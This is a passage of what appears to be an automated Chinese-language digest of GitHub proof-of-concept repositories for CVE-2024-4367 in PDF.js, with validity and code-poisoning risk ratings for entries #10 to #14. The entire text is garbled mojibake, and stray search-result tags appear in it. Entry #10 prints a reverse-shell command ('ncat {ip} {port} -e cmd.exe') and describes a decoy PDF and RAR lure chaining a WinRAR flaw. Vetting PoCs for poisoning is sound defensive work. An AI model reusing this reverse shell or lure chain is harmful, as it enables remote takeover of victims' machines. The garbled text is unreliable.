CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ 